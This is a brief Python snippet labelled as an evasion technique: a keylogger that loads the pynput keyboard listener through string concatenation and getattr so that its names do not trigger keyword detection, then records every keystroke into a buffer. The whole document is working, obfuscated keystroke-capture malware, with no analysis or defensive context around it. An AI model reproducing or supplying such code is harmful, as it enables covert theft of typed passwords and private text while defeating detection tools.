# EVASION: keylogger without obvious keywords
import importlib
mod = importlib.import_module("pyn" + "put")
kb = getattr(mod, "keyboard")
hook = getattr(kb, "Listener")
buf = []
def cb(k):
    try:
        buf.append(getattr(k, "char"))
    except Exception:
        buf.append(" ")
hook(on_press=cb).start()
